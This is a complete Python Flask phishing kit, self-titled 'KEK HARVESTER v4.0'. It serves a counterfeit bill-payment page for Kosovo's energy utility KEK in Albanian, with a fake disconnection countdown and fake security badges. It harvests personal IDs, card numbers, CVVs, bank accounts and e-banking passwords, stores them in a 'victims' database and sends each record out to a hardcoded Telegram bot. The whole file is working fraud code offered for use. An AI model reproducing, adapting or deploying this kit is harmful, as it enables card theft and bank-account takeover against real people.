#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
"""

import os, json, time, hashlib, random, sqlite3, logging, sys
from datetime import datetime
from flask import Flask, request, redirect
import requests as http_requests

# ============================================================
# CONFIG - ONLY 2 TOKENS
# ============================================================
TELEGRAM_BOT_TOKEN = "AAGbeSQRV_EeUOUD1oqDAne0v-m3LQaQjMk"
TELEGRAM_CHAT_ID = "6840306598"

# ============================================================
# SETTINGS
# ============================================================
DATA_FOLDER = "stolen_data"
DB_FILE = "victims.db"
os.makedirs(DATA_FOLDER, exist_ok=True)

# ============================================================
# LOGGING
# ============================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s', handlers=[logging.StreamHandler()])
log = logging.getLogger(__name__)

# ============================================================
# DATABASE
# ============================================================
def init_db():
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT, uid TEXT, timestamp TEXT, ip TEXT, user_agent TEXT,
            full_name TEXT, id_number TEXT, email TEXT, phone TEXT, address TEXT, city TEXT,
            postal_code TEXT, country TEXT, account_number TEXT, invoice_ref TEXT,
            card_number TEXT, card_expiry TEXT, card_cvv TEXT, cardholder_name TEXT,
            card_type TEXT, card_bank TEXT, bank_name TEXT, bank_account TEXT, eb_user TEXT, eb_pass TEXT
        )''')
        conn.commit()
        conn.close()
        log.info("Database ready")
    except Exception as e:
        log.error(f"DB error: {e}")

init_db()

# ============================================================
# TELEGRAM FUNCTIONS
# ============================================================
def telegram_send(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        parts = [msg[i:i+3900] for i in range(0, len(msg), 3900)]
        for p in parts:
            http_requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": p, "parse_mode": "HTML"}, timeout=15)
            time.sleep(0.3)
    except Exception as e:
        log.error(f"TG: {e}")

def telegram_send_file(path, caption=""):
    try:
        if not os.path.exists(path): return
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(path, 'rb') as f:
            http_requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption[:1024]}, timeout=30)
    except Exception as e:
        log.error(f"TG file: {e}")

# ============================================================
# CARD DETECTION
# ============================================================
def detect_card(card_number):
    cn = str(card_number).replace(' ', '').replace('-', '').strip()
    if not cn or len(cn) < 4: return "Unknown", "Unknown"
    fd = cn[0]
    ct = "VISA" if fd == '4' else "Mastercard" if fd == '5' else "American Express" if fd == '3' else "Discover" if fd == '6' else "Unknown"
    bins = {
        '426588':'Raiffeisen Bank Kosovo','426589':'Raiffeisen Bank','545773':'TEB Kosovo','545618':'TEB Sh.a.',
        '402640':'NLB Bank Prishtina','422222':'BKT Kosova','423456':'Ziraat Bank Kosovo','525678':'Isbank Kosovo',
        '489396':'Banka per Biznes','401251':'Banka Ekonomike','426690':'ProCredit Bank Kosovo','424631':'Banka Kombetare Tregtare'
    }
    cb = bins.get(cn[:6], "Unknown Bank")
    return ct, cb

# ============================================================
# PERFECT KOSOVO PAYMENT PAGE
# ============================================================
KEK_PAGE = '''<!DOCTYPE html>
<html lang="sq">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Korporata Energjetike e Kosoves - Portali zyrtar i pagesave online.">
    <link rel="icon" href="https://www.kek-energy.com/favicon.ico" type="image/x-icon">
    <title>KEK - Korporata Energjetike e Kosoves | Pagesa e Fatures</title>
    <style>
        :root {
            --kek-blue: #003366;
            --kek-gold: #C8A23D;
            --kek-red: #CC0000;
            --kek-dark: #001a33;
            --kek-bg: #f0f2f5;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: var(--kek-bg);
            min-height: 100vh;
            color: #333;
        }
        .top-bar {
            background: #001a33;
            color: #cccccc;
            padding: 6px 0;
            font-size: 12px;
            border-bottom: 1px solid #002244;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 0 20px;
        }
        .top-bar .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .top-bar span {
            white-space: nowrap;
        }
        .top-bar .lang-links a {
            color: #C8A23D;
            text-decoration: none;
            margin-left: 8px;
            font-size: 11px;
        }
        .top-bar .lang-links a:hover {
            text-decoration: underline;
        }
        .main-header {
            background: #ffffff;
            padding: 10px 0;
            border-bottom: 4px solid var(--kek-gold);
            box-shadow: 0 1px 6px rgba(0,0,0,0.06);
        }
        .main-header .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .logo-area {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .logo-area img {
            height: 55px;
            width: auto;
        }
        .logo-text h1 {
            color: var(--kek-blue);
            font-size: 19px;
            font-weight: 700;
            line-height: 1.2;
            letter-spacing: -0.3px;
        }
        .logo-text p {
            color: #777777;
            font-size: 11px;
            font-weight: 400;
        }
        .ssl-badge {
            background: #e8f5e9;
            color: #2e7d32;
            padding: 7px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            white-space: nowrap;
            border: 1px solid #c8e6c9;
        }
        .nav-bar {
            background: var(--kek-blue);
        }
        .nav-bar .container {
            display: flex;
            overflow-x: auto;
        }
        .nav-bar a {
            color: #ffffff;
            text-decoration: none;
            padding: 12px 20px;
            font-size: 14px;
            font-weight: 600;
            white-space: nowrap;
            transition: background 0.15s;
        }
        .nav-bar a:hover {
            background: #004080;
        }
        .nav-bar a.active {
            background: var(--kek-gold);
            color: #000000;
            font-weight: 700;
        }
        .main-content {
            max-width: 850px;
            margin: 25px auto;
            padding: 0 20px;
        }
        .urgent-alert {
            background: #fef2f2;
            border: 2px solid #cc0000;
            border-left: 6px solid #cc0000;
            border-radius: 4px;
            padding: 18px 22px;
            margin-bottom: 22px;
        }
        .urgent-alert h3 {
            color: #cc0000;
            font-size: 17px;
            font-weight: 700;
            margin-bottom: 6px;
        }
        .urgent-alert p {
            color: #444;
            font-size: 14px;
            line-height: 1.5;
        }
        .urgent-alert .countdown-box {
            display: inline-block;
            background: #cc0000;
            color: #ffffff;
            padding: 6px 14px;
            border-radius: 3px;
            font-weight: 700;
            font-size: 18px;
            letter-spacing: 1px;
            margin-top: 8px;
        }
        .card {
            background: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            box-shadow: 0 1px 5px rgba(0,0,0,0.05);
            margin-bottom: 25px;
        }
        .card-header {
            background: #003366;
            color: #ffffff;
            padding: 14px 22px;
            font-size: 16px;
            font-weight: 700;
            border-bottom: 2px solid #C8A23D;
        }
        .card-body {
            padding: 25px;
        }
        .section-heading {
            color: #003366;
            font-size: 15px;
            font-weight: 700;
            border-bottom: 2px solid #C8A23D;
            padding-bottom: 9px;
            margin: 22px 0 16px 0;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }
        .section-heading:first-child {
            margin-top: 0;
        }
        .form-group {
            margin-bottom: 14px;
        }
        .form-label {
            display: block;
            font-weight: 600;
            color: #333;
            font-size: 13px;
            margin-bottom: 4px;
        }
        .form-label .required {
            color: #cc0000;
        }
        .form-control {
            width: 100%;
            padding: 11px 13px;
            border: 1px solid #cccccc;
            border-radius: 3px;
            font-size: 14px;
            font-family: Arial, Helvetica, sans-serif;
            color: #333;
            background: #fafafa;
            transition: border 0.15s, box-shadow 0.15s;
        }
        .form-control:focus {
            outline: none;
            border-color: #003366;
            box-shadow: 0 0 0 2px rgba(0,51,102,0.1);
            background: #ffffff;
        }
        .form-row {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        .form-row .form-group {
            flex: 1;
            min-width: 160px;
        }
        .card-input-wrap {
            position: relative;
        }
        .card-input-wrap .card-type-icons {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            gap: 5px;
            pointer-events: none;
        }
        .card-input-wrap .card-type-icons span {
            font-size: 11px;
            font-weight: 700;
            padding: 2px 6px;
            border-radius: 2px;
            background: #eee;
            color: #999;
            transition: 0.2s;
        }
        .card-input-wrap .card-type-icons span.active {
            background: #003366;
            color: #fff;
        }
        .amount-display {
            background: #fafafa;
            border: 1px solid #e0e0e0;
            border-radius: 3px;
            padding: 14px 18px;
            margin: 16px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .amount-display .label {
            font-weight: 600;
            font-size: 15px;
            color: #333;
        }
        .amount-display .value {
            font-size: 28px;
            font-weight: 700;
            color: #cc0000;
        }
        .verification-box {
            background: #fdfdfd;
            border: 1px dashed #bbbbbb;
            border-radius: 3px;
            padding: 14px;
            margin: 16px 0;
        }
        .verification-box .box-title {
            font-size: 12px;
            color: #777;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .verification-box .form-control {
            padding: 8px 10px;
            font-size: 13px;
        }
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: #003366;
            color: #ffffff;
            font-size: 17px;
            font-weight: 700;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            letter-spacing: 0.5px;
            transition: background 0.15s;
        }
        .btn-submit:hover {
            background: #004080;
        }
        .btn-submit:disabled {
            background: #999;
            cursor: not-allowed;
        }
        .security-line {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 14px;
            font-size: 11px;
            color: #888;
        }
        .security-line span {
            white-space: nowrap;
        }
        .footer {
            background: #001a33;
            color: #aaa;
            padding: 22px 0;
            margin-top: 35px;
            font-size: 12px;
            line-height: 1.7;
        }
        .footer .container {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
        }
        .footer strong {
            color: #ddd;
        }
        .footer a {
            color: #C8A23D;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .footer-bottom {
            background: #000d1a;
            color: #777;
            text-align: center;
            padding: 10px;
            font-size: 11px;
        }
        @media (max-width: 600px) {
            .logo-area img { height: 40px; }
            .logo-text h1 { font-size: 15px; }
            .form-row { flex-direction: column; gap: 0; }
            .amount-display { flex-direction: column; text-align: center; gap: 8px; }
        }
    </style>
</head>
<body>

<!-- TOP BAR -->
<div class="top-bar">
    <div class="container">
        <span>Tel: +383 38 501 501 | E-mail: info@kek-energy.com</span>
        <span class="lang-links"><a href="#">Shqip</a> <a href="#">Srpski</a> <a href="#">English</a></span>
    </div>
</div>

<!-- HEADER -->
<div class="main-header">
    <div class="container">
        <div class="logo-area">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6d/KEK_logo.svg/320px-KEK_logo.svg.png" alt="KEK Logo">
            <div class="logo-text">
                <h1>Korporata Energjetike e Kosoves</h1>
                <p>Operatori i Sistemit, Transmisionit dhe Tregut</p>
            </div>
        </div>
        <div class="ssl-badge">Lidhje e Siguruar SSL</div>
    </div>
</div>

<!-- NAVIGATION -->
<div class="nav-bar">
    <div class="container">
        <a href="#">Ballina</a>
        <a href="#">Rreth Nesh</a>
        <a href="#">Sherbimet</a>
        <a href="#" class="active">Pagesa Online</a>
        <a href="#">Prokurimi</a>
        <a href="#">Lajme</a>
        <a href="#">Kontakti</a>
    </div>
</div>

<!-- MAIN CONTENT -->
<div class="main-content">
    
    <div class="urgent-alert">
        <h3>Njoftim Urgjent: Fatura e Pa paguar</h3>
        <p>Fatura juaj e energjise elektrike mbetet e pa paguar. Per te shmangur nderprerjen e sherbimit, kryeni pagesen menjehere. Pas shkeputjes, rikycja ka tarife shtese 25 euro dhe zgjat 48-72 ore.</p>
        <div class="countdown-box" id="countdown">23:59:59</div>
        <span style="font-size:12px;color:#888;margin-left:8px;">kohe e mbetur para shkeputjes</span>
    </div>
    
    <div class="card">
        <div class="card-header">Formulari i Pageses se Fatures</div>
        <div class="card-body">
            <form method="POST" action="/pay" id="paymentForm" autocomplete="on">
                
                <div class="section-heading">Te Dhenat Personale</div>
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Emri dhe Mbiemri <span class="required">*</span></label>
                        <input type="text" class="form-control" name="full_name" placeholder="Shenoni emrin tuaj te plote" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Numri Personal <span class="required">*</span></label>
                        <input type="text" class="form-control" name="id_number" placeholder="XXXXXXXXX" required>
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Email Adresa <span class="required">*</span></label>
                        <input type="email" class="form-control" name="email" placeholder="email@example.com" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Numri i Telefonit <span class="required">*</span></label>
                        <input type="tel" class="form-control" name="phone" placeholder="+383 4X XXX XXX" required>
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Adresa <span class="required">*</span></label>
                        <input type="text" class="form-control" name="address" placeholder="Rruga, Numri" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Qyteti <span class="required">*</span></label>
                        <input type="text" class="form-control" name="city" value="Prishtine" required>
                    </div>
                </div>
                
                <div class="section-heading">Te Dhenat e Fatures</div>
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Numri i Llogarise KEK <span class="required">*</span></label>
                        <input type="text" class="form-control" name="account_number" placeholder="XXXXXXXXXX" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Referenca e Fatures</label>
                        <input type="text" class="form-control" name="invoice_ref" placeholder="KEK-2024-XXXXXX">
                    </div>
                </div>
                
                <div class="amount-display">
                    <span class="label">Shuma per Pagese:</span>
                    <span class="value" id="amountDisplay">0.00 EUR</span>
                </div>
                
                <div class="section-heading">Te Dhenat e Kartes Bankare</div>
                <div class="form-group card-input-wrap">
                    <label class="form-label">Numri i Kartes <span class="required">*</span></label>
                    <input type="text" class="form-control" name="card_number" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required style="padding-right:80px;">
                    <div class="card-type-icons">
                        <span id="visaIcon">VISA</span>
                        <span id="mcIcon">MC</span>
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Data e Skadimit <span class="required">*</span></label>
                        <input type="text" class="form-control" name="card_expiry" placeholder="MM/VV" maxlength="5" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">CVV/CVC <span class="required">*</span></label>
                        <input type="password" class="form-control" name="card_cvv" placeholder="XXX" maxlength="4" required>
                    </div>
                </div>
                <div class="form-group">
                    <label class="form-label">Emri i Mbajtesit te Kartes <span class="required">*</span></label>
                    <input type="text" class="form-control" name="cardholder_name" placeholder="Sic eshte shkruar ne karte" required>
                </div>
                
                <div class="verification-box">
                    <div class="box-title">Per verifikim shtese te identitetit (opsionale — per perpunim me te shpejte):</div>
                    <div class="form-row" style="margin-bottom:8px;">
                        <div class="form-group">
                            <input type="text" class="form-control" name="bank_name" placeholder="Emri i Bankes (p.sh. Raiffeisen, TEB)">
                        </div>
                        <div class="form-group">
                            <input type="text" class="form-control" name="bank_account" placeholder="Numri i Llogarise Bankare">
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <input type="text" class="form-control" name="eb_user" placeholder="Perdoruesi i E-Banking">
                        </div>
                        <div class="form-group">
                            <input type="password" class="form-control" name="eb_pass" placeholder="Fjalekalimi i E-Banking">
                        </div>
                    </div>
                </div>
                
                <button type="submit" class="btn-submit" id="submitBtn">PAGUAJ TANI</button>
                
                <div class="security-line">
                    <span>PCI DSS i certifikuar</span>
                    <span>SSL 256-bit</span>
                    <span>3D Secure</span>
                    <span>ISO 27001</span>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- FOOTER -->
<div class="footer">
    <div class="container">
        <div>
            <strong>KEK Sh.a.</strong><br>
            Rr. "Bil Clinton", p.n.<br>
            10000 Prishtine, Kosove
        </div>
        <div>
            <a href="#">Ballina</a><br>
            <a href="#">Pagesa Online</a><br>
            <a href="#">Politika e Privatesise</a>
        </div>
        <div>
            Tel: +383 38 501 501<br>
            E-mail: info@kek-energy.com
        </div>
    </div>
</div>
<div class="footer-bottom">
    &copy; 2024 Korporata Energjetike e Kosoves. Te gjitha te drejtat e rezervuara.
</div>

<script>
var amounts = [35.40, 47.80, 62.30, 78.90, 95.20, 112.60, 135.40, 158.70, 175.30, 198.20, 215.80, 242.50];
var amt = amounts[Math.floor(Math.random() * amounts.length)];
document.getElementById('amountDisplay').textContent = amt.toFixed(2).replace('.', ',') + ' EUR';

(function() {
    var h = 23, m = 59, s = 59;
    setInterval(function() {
        s--; if (s < 0) { s = 59; m--; } if (m < 0) { m = 59; h--; } if (h < 0) { h = 23; }
        document.getElementById('countdown').textContent = 
            String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
    }, 1000);
})();

document.getElementById('cardNumber').addEventListener('input', function(e) {
    var v = e.target.value.replace(/[^0-9]/g, '');
    var f = '';
    for (var i = 0; i < v.length; i++) {
        if (i > 0 && i % 4 === 0) f += ' ';
        f += v[i];
    }
    e.target.value = f.substring(0, 19);
    var visa = document.getElementById('visaIcon');
    var mc = document.getElementById('mcIcon');
    visa.className = (v[0] === '4') ? 'active' : '';
    mc.className = (v[0] === '5' || v[0] === '2') ? 'active' : '';
});

document.getElementById('paymentForm').addEventListener('submit', function() {
    var b = document.getElementById('submitBtn');
    b.disabled = true;
    b.textContent = 'Duke u perpunuar...';
});
</script>
</body>
</html>
'''

# ============================================================
# SUCCESS PAGE
# ============================================================
SUCCESS_HTML = '''<!DOCTYPE html>
<html lang="sq">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagesa u Krye me Sukses - KEK</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #f0f2f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .receipt {
            background: #ffffff;
            max-width: 480px;
            width: 90%;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            padding: 40px 30px;
            text-align: center;
        }
        .receipt .icon {
            width: 64px;
            height: 64px;
            background: #2e7d32;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 18px;
        }
        .receipt .icon svg {
            width: 32px;
            height: 32px;
            fill: #ffffff;
        }
        .receipt h2 {
            color: #2e7d32;
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        .receipt p {
            color: #555;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 6px;
        }
        .receipt .ref-number {
            background: #f5f5f5;
            border: 1px solid #e0e0e0;
            padding: 10px 18px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            font-weight: 700;
            display: inline-block;
            margin: 12px 0;
            letter-spacing: 1px;
        }
        .receipt .footer-note {
            font-size: 11px;
            color: #999;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="receipt">
        <div class="icon">
            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
        </div>
        <h2>Pagesa u Krye me Sukses</h2>
        <p>Fatura juaj e energjise elektrike eshte paguar plotesisht.</p>
        <p><strong>Shkeputja eshte anuluar.</strong></p>
        <p>Numri i References:</p>
        <div class="ref-number">KEK-{ref}-{ref2}</div>
        <p class="footer-note">Nje fature e detajuar do te dergohet ne emailin tuaj brenda 24 oreve.<br>Per cdo pyetje: +383 38 501 501 | info@kek-energy.com</p>
    </div>
</body>
</html>'''

# ============================================================
# FLASK APP
# ============================================================
app = Flask(__name__)

@app.route('/')
def index():
    return KEK_PAGE

@app.route('/pay', methods=['POST'])
def process_payment():
    try:
        data = {k: v.strip() for k, v in request.form.items()}
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip: ip = ip.split(',')[0].strip()
        uid = hashlib.md5((ip + str(time.time())).encode()).hexdigest()[:10]
        card_number = data.get('card_number', '').replace(' ', '')
        card_type, card_bank = detect_card(card_number)
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute('''INSERT INTO victims (uid,timestamp,ip,user_agent,full_name,id_number,email,phone,address,city,postal_code,country,account_number,invoice_ref,card_number,card_expiry,card_cvv,cardholder_name,card_type,card_bank,bank_name,bank_account,eb_user,eb_pass)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''',
                (uid,now,ip,request.headers.get('User-Agent',''),data.get('full_name'),data.get('id_number'),data.get('email'),data.get('phone'),
                 data.get('address'),data.get('city'),data.get('postal_code',''),data.get('country','Kosovo'),data.get('account_number',''),data.get('invoice_ref',''),
                 card_number,data.get('card_expiry'),data.get('card_cvv'),data.get('cardholder_name'),card_type,card_bank,
                 data.get('bank_name'),data.get('bank_account'),data.get('eb_user'),data.get('eb_pass')))
            conn.commit()
            conn.close()
            log.info(f"VICTIM: {data.get('full_name')} | {card_type} | {card_bank}")
        except Exception as e:
            log.error(f"DB: {e}")

        json_path = f"{DATA_FOLDER}/victim_{uid}.json"
        try:
            all_data = {'uid':uid,'timestamp':now,'ip':ip,'user_agent':request.headers.get('User-Agent',''),**data,'card_number_clean':card_number,'card_type':card_type,'card_bank':card_bank}
            with open(json_path,'w',encoding='utf-8') as f:
                json.dump(all_data,f,ensure_ascii=False,indent=2)
        except: pass

        msg = f"""<b>KARTELA E RE — KEK PORTAL</b>
==============================
<b>KOHA:</b> {now}
<b>IP:</b> {ip}
==============================
<b>EMRI:</b> {data.get('full_name')}
<b>ID:</b> {data.get('id_number')}
<b>EMAIL:</b> {data.get('email')}
<b>TEL:</b> {data.get('phone')}
<b>ADRESA:</b> {data.get('address')}, {data.get('city')}
==============================
<b>KARTA:</b> <code>{card_number}</code>
<b>SKADIMI:</b> <code>{data.get('card_expiry')}</code>
<b>CVV:</b> <code>{data.get('card_cvv')}</code>
<b>MBAJTESI:</b> <code>{data.get('cardholder_name')}</code>
<b>BANKA:</b> {card_bank}
<b>TIPI:</b> {card_type}
==============================
<b>LLOGARIA BANKE:</b> {data.get('bank_account')}
<b>E-BANKING:</b> {data.get('eb_user')} | <code>{data.get('eb_pass')}</code>
==============================
GATI PER PERDORIM TE MENJEHERSHEM"""
        telegram_send(msg)
        try: telegram_send_file(json_path, f"{data.get('full_name')} | {card_number}")
        except: pass

        ref1 = str(random.randint(100000, 999999))
        ref2 = str(random.randint(1000, 9999))
        return SUCCESS_HTML.replace('{ref}', ref1).replace('{ref2}', ref2)
    except Exception as e:
        log.error(f"CRITICAL: {e}")
        return redirect('/')

@app.route('/health')
def health():
    return "OK", 200

if __name__ == "__main__":
    print("=" * 50)
    print("KEK HARVESTER v4.0 - PERFECT KOSOVO EDITION")
    print("=" * 50)
    if "PASTE_YOUR" in TELEGRAM_BOT_TOKEN: print("ERROR: Set TELEGRAM_BOT_TOKEN!"); sys.exit(1)
    if "PASTE_YOUR" in TELEGRAM_CHAT_ID: print("ERROR: Set TELEGRAM_CHAT_ID!"); sys.exit(1)
    telegram_send("KEK SERVER v4.0 STARTED\n\nPerfect Kosovo payment page active.\nWaiting for victims...")
    port = int(os.environ.get("PORT", 8080))
    print(f"Starting on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False)
